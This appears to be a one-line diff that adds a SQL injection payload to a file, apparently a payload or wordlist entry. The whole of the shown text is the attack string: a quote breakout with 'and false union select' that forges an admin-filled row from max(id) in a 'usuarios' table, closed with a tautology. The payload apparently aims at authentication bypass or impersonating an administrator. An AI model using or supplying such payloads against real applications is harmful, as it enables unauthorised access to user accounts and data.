@@ -1,0 +1,1 @@
+abc' and false union select  max(id),'admin','admin','admin','admin','admin','admin','admin','admin','admin','admin','admin','admin','admin','admin','admin','admin',3,'admin','admin','admin','admin','admin' from usuarios where 'abc'='abc
